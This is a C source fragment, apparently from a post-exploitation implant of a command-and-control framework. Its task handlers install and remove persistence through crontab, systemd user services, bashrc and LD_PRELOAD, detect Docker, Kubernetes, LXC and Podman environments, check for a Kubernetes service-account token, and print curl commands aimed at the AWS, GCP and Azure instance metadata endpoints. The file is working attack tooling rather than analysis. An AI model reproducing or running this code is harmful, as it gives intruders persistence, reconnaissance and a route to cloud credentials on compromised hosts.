        } else if (klen == 3 && ax_memcmp(key, "cmd", 3) == 0) {
            mp_read_str(&r, &val, &vlen);
            if (vlen >= sizeof(cmd)) vlen = sizeof(cmd) - 1;
            ax_memcpy(cmd, val, vlen); cmd[vlen] = '\0';
        } else if (klen == 8 && ax_memcmp(key, "schedule", 8) == 0) {
            mp_read_str(&r, &val, &vlen);
            if (vlen >= sizeof(schedule)) vlen = sizeof(schedule) - 1;
            ax_memcpy(schedule, val, vlen); schedule[vlen] = '\0';
        } else if (klen == 4 && ax_memcmp(key, "name", 4) == 0) {
            mp_read_str(&r, &val, &vlen);
            if (vlen >= sizeof(name)) vlen = sizeof(name) - 1;
            ax_memcpy(name, val, vlen); name[vlen] = '\0';
        } else if (klen == 4 && ax_memcmp(key, "path", 4) == 0) {
            mp_read_str(&r, &val, &vlen);
            if (vlen >= sizeof(path)) vlen = sizeof(path) - 1;
            ax_memcpy(path, val, vlen); path[vlen] = '\0';
        } else if (klen == 4 && ax_memcmp(key, "type", 4) == 0) {
            mp_read_str(&r, &val, &vlen);
            if (vlen >= sizeof(type)) vlen = sizeof(type) - 1;
            ax_memcpy(type, val, vlen); type[vlen] = '\0';
        } else {
            mp_skip(&r);
        }
    }

    strbuf_t sb;
    sb_init(&sb);

    if (ax_strcmp(action, "crontab") == 0) {
        persist_crontab(cmd, schedule, &sb);
    } else if (ax_strcmp(action, "systemd") == 0) {
        persist_systemd(name, cmd, &sb);
    } else if (ax_strcmp(action, "bashrc") == 0) {
        persist_bashrc(cmd, &sb);
    } else if (ax_strcmp(action, "ldpreload") == 0) {
        persist_ldpreload(path, &sb);
    } else if (ax_strcmp(action, "remove") == 0) {
        // Basic removal based on type
        if (ax_strcmp(type, "crontab") == 0) {
            // Remove all crontab entries
            int pid = sys_fork();
            if (pid == 0) {
                char *argv[] = {"/usr/bin/crontab", "-r", (char *)0};
                char *envp[] = {(char *)0};
                sys_execve("/usr/bin/crontab", argv, envp);
                sys_exit_group(1);
            }
            if (pid > 0) { int s = 0; sys_wait4(pid, &s, 0, (void *)0); }
            sb_append(&sb, "  [+] Crontab removed\n");
        } else if (ax_strcmp(type, "systemd") == 0 && name[0]) {
            char home[256];
            persist_get_home(home, sizeof(home));
            char svc_path[512];
            ax_strcpy(svc_path, home);
            ax_strcat(svc_path, "/.config/systemd/user/");
            ax_strcat(svc_path, name);
            ax_strcat(svc_path, ".service");
            // Stop and disable
            int pid = sys_fork();
            if (pid == 0) {
                char svc_name[256];
                ax_strcpy(svc_name, name);
                ax_strcat(svc_name, ".service");
                char *argv[] = {"/usr/bin/systemctl", "--user", "disable", "--now", svc_name, (char *)0};
                char *envp[] = {(char *)0};
                sys_execve("/usr/bin/systemctl", argv, envp);
                sys_exit_group(1);
            }
            if (pid > 0) { int s = 0; sys_wait4(pid, &s, 0, (void *)0); }
            sys_unlink(svc_path);
            sb_append(&sb, "  [+] Systemd service removed: ");
            sb_append(&sb, name);
            sb_append(&sb, "\n");
        } else {
            sb_append(&sb, "  [!] Specify type (crontab/systemd) and name\n");
        }
    } else if (ax_strcmp(action, "status") == 0) {
        persist_status(&sb);
    } else {
        sb_append(&sb, "  [!] Unknown action: ");
        sb_append(&sb, action);
        sb_append(&sb, "\n");
    }

    write_output(w, sb.data);
    sb_free(&sb);
    return 0;
}

// ──── CONTAINER / CLOUD ────

static void detect_container(strbuf_t *sb) {
    sb_append(sb, "--- Container Detection ---\n");

    int found = 0;

    // Docker
    if (file_exists("/.dockerenv")) {
        sb_append(sb, "  [+] Docker container detected (/.dockerenv exists)\n");
        found = 1;
    }

    // Check cgroup for docker/lxc/k8s
    char cgroup[4096];
    long n = read_file("/proc/1/cgroup", cgroup, sizeof(cgroup));
    if (n > 0) {
        if (ax_strstr(cgroup, "docker")) {
            sb_append(sb, "  [+] Docker detected in /proc/1/cgroup\n");
            found = 1;
        }
        if (ax_strstr(cgroup, "kubepods")) {
            sb_append(sb, "  [+] Kubernetes pod detected in /proc/1/cgroup\n");
            found = 1;
        }
        if (ax_strstr(cgroup, "lxc")) {
            sb_append(sb, "  [+] LXC container detected in /proc/1/cgroup\n");
            found = 1;
        }
    }

    // Podman
    char container_env[256];
    n = read_file("/run/.containerenv", container_env, sizeof(container_env));
    if (n > 0) {
        sb_append(sb, "  [+] Podman container detected (/run/.containerenv)\n");
        found = 1;
    }

    // K8s service account
    if (file_exists("/var/run/secrets/kubernetes.io/serviceaccount/token")) {
        sb_append(sb, "  [+] Kubernetes service account found\n");
        found = 1;
    }

    if (!found) {
        sb_append(sb, "  (no container detected — likely bare-metal/VM)\n");
    }
}

static void detect_cloud(strbuf_t *sb) {
    sb_append(sb, "\n--- Cloud Provider Detection ---\n");

    // Check DMI/SMBIOS for cloud hints
    char dmi[256];
    int detected = 0;

    if (read_file("/sys/class/dmi/id/sys_vendor", dmi, sizeof(dmi)) > 0) {
        // Strip newline
        size_t dlen = ax_strlen(dmi);
        if (dlen > 0 && dmi[dlen - 1] == '\n') dmi[dlen - 1] = '\0';

        if (ax_strstr(dmi, "Amazon") || ax_strstr(dmi, "amazon")) {
            sb_append(sb, "  [+] AWS detected (sys_vendor: ");
            sb_append(sb, dmi);
            sb_append(sb, ")\n");
            detected = 1;
        } else if (ax_strstr(dmi, "Google")) {
            sb_append(sb, "  [+] GCP detected (sys_vendor: ");
            sb_append(sb, dmi);
            sb_append(sb, ")\n");
            detected = 1;
        } else if (ax_strstr(dmi, "Microsoft")) {
            sb_append(sb, "  [+] Azure detected (sys_vendor: ");
            sb_append(sb, dmi);
            sb_append(sb, ")\n");
            detected = 1;
        } else {
            sb_append(sb, "  sys_vendor: ");
            sb_append(sb, dmi);
            sb_append(sb, "\n");
        }
    }

    if (read_file("/sys/class/dmi/id/product_name", dmi, sizeof(dmi)) > 0) {
        size_t dlen = ax_strlen(dmi);
        if (dlen > 0 && dmi[dlen - 1] == '\n') dmi[dlen - 1] = '\0';
        sb_append(sb, "  product_name: ");
        sb_append(sb, dmi);
        sb_append(sb, "\n");
    }

    if (!detected) {
        sb_append(sb, "  (no cloud provider detected from DMI)\n");
    }
}

static void fetch_metadata(strbuf_t *sb) {
    sb_append(sb, "\n--- Cloud Metadata (IMDS) ---\n");
    sb_append(sb, "  Note: IMDS requires network access to 169.254.169.254\n");
    sb_append(sb, "  Use 'shell curl -s http://169.254.169.254/latest/meta-data/' for AWS\n");
    sb_append(sb, "  Use 'shell curl -s -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/' for GCP\n");
    sb_append(sb, "  Use 'shell curl -s -H \"Metadata: true\" http://169.254.169.254/metadata/instance?api-version=2021-02-01' for Azure\n");

    // Try to read instance-id from sysfs (works on some cloud providers without network)
    char buf[256];
    if (read_file("/sys/class/dmi/id/board_asset_tag", buf, sizeof(buf)) > 0) {
        size_t dlen = ax_strlen(buf);
        if (dlen > 0 && buf[dlen - 1] == '\n') buf[dlen - 1] = '\0';
        if (ax_strlen(buf) > 1) {
            sb_append(sb, "  board_asset_tag: ");
            sb_append(sb, buf);
            sb_append(sb, "\n");
        }
    }
    if (read_file("/sys/class/dmi/id/chassis_asset_tag", buf, sizeof(buf)) > 0) {
        size_t dlen = ax_strlen(buf);
        if (dlen > 0 && buf[dlen - 1] == '\n') buf[dlen - 1] = '\0';
        if (ax_strlen(buf) > 1) {
            sb_append(sb, "  chassis_asset_tag: ");
            sb_append(sb, buf);
            sb_append(sb, "\n");
        }
    }
}

int task_container(const uint8_t *data, uint32_t data_len, mp_writer_t *w)
{
    char action[64] = {0};
    parse_string_field(data, data_len, "action", action, sizeof(action));
    if (action[0] == '\0') ax_strcpy(action, "detect");

    strbuf_t sb;
    sb_init(&sb);

    if (ax_strcmp(action, "detect") == 0) {
        detect_container(&sb);
        detect_cloud(&sb);
    } else if (ax_strcmp(action, "metadata") == 0) {
        detect_container(&sb);
        detect_cloud(&sb);
        fetch_metadata(&sb);
    } else {
        sb_append(&sb, "  [!] Unknown action: ");
        sb_append(&sb, action);
        sb_append(&sb, " (use: detect, metadata)\n");
    }

    write_output(w, sb.data);
    sb_free(&sb);
    return 0;
}
